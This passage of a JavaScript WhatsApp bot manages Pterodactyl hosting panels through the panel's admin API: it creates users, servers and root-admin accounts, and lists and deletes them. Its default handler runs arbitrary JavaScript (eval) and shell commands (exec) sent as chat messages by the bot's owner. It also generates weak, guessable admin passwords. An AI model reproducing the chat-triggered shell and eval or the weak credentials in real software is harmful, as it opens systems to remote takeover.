"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return Rafliereply("Server panel tidak ditemukan!")
Rafliereply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

case "1gbv3": case "2gbv3": case "3gbv3": case "4gbv3": case "5gbv3": case "6gbv3": case "7gbv3": case "8gbv3": case "9gbv3": case "10gbv3": case "unlimitedv3": case "unliv3": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return Rafliereply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gbv3") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gbv3") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gbv3") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gbv3") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gbv3") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gbv3") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gbv3") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gbv3") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gbv3") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gbv3") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Rafliereply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return Rafliereply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Rafliereply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("akunpanel.txt", teks)
await Raflie.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

case "cadpv3": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Rafliereply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Rafliereply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Rafliereply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await Raflie.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
}
break



case "listadminv3": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return Rafliereply("Tidak ada admin panel")
var teks = " *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Raflie.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladminv3`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© ʀᴀғʟɪᴇ ɪs ʙᴀᴄᴋ`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break



case "listpanelv3": case "listpv3": case "listserverv3": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return Rafliereply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await Raflie.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanelv3`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `© ʀᴀғʟɪᴇ ɪs ʙᴀᴄᴋ`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break



case "deladminv3": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return Rafliereply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladminv3 ${i.attributes.id}`
})
})
return Raflie.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© ʀᴀғʟɪᴇ ɪs ʙᴀᴄᴋ`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return Rafliereply("Akun admin panel tidak ditemukan!")
await Rafliereply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break



case "delpanelv3": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return Rafliereply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel ${s.id}`
})
}

return Raflie.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© ʀᴀғʟɪᴇ ɪs ʙᴀᴄᴋ`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return Rafliereply("Server panel tidak ditemukan!")
Rafliereply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//======================================================================================= END ==============\\

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await Rafliereply(evaled)
} catch (err) {
await Rafliereply(String(err))
}}


if (m.text.toLowerCase() == "cek") {
Rafliereply(`ʜᴀʟᴏ ᴋᴀᴋ ${pushname} ʙᴏᴛ ᴍᴀsɪʜ ᴏɴʟɪɴᴇ ᴋᴏᴋ`)
}


if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await Rafliereply(evaled)
} catch (err) {
await Rafliereply(String(err))
}}


if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return Rafliereply(`${err}`)
if (stdout) return Rafliereply(stdout)
})
}


}
} catch (err) {
console.log(util.format(err));
let Obj = global.owner
Raflie.sendMessage(Obj + "@s.whatsapp.net", {text: `*Hallo developer, telah terjadi error pada command :* ${isCmd ? prefix+command : m.text}

*Detail informasi error :*
${util.format(err)}`, contextInfo: { isForwarded: true }}, {quoted: m})
}}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});